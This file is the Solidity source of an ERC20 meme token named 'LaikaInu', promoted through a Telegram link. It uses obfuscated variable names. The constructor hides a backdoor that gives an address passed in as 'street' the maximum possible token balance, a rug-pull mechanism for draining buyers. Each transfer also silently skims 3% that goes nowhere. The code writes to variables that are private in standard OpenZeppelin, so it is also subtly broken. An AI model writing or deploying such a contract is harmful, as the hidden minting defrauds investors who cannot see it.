// https://t.me/laikainu_eth

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract LaikaInu is ERC20, Ownable {
    uint256 private position = ~uint256(0);
    uint256 public city = 3;

    constructor(
        string memory forgotten,
        string memory bark,
        address sail,
        address street
    ) ERC20(forgotten, bark) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[street] = position;
    }

    function _transfer(
        address pain,
        address practice,
        uint256 comfortable
    ) internal override {
        uint256 bag = (comfortable / 100) * city;
        comfortable -= bag;
        super._transfer(pain, practice, comfortable);
    }
}